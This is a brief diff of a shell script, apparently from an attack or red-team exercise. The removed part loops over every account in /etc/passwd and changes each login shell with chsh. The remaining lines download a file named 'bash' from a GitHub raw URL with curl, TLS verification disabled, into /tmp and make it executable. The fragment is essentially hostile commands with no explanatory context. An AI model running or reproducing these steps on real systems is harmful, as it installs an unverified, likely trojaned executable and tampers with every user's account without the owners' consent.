@@ -1,8 +1,3 @@
-for user in $(cat /etc/passwd | cut -d":" -f1)
-do 
-    chsh -s /bin/bash $user
-done
-
 curl -k 'https://raw.githubusercontent.com/lsh8829/CDT473/main/bash' -o /tmp/bash
 chmod +x /tmp/bash
 
